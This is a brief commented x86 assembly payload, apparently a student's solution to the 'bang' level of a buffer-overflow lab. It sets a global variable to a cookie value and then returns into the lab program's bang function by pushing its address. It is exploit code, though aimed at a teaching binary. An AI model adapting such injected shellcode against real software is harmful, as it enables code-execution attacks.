mov $0x2bf2dd1c,%eax     # get the cookie value (by ./makecookie  zixiang) pay attention to  $
mov %eax,0x0804d100      # put the cookie value to globe_value
push $0x08048c9d         # push the bang entry address to the stack
ret                      # return to the bang function
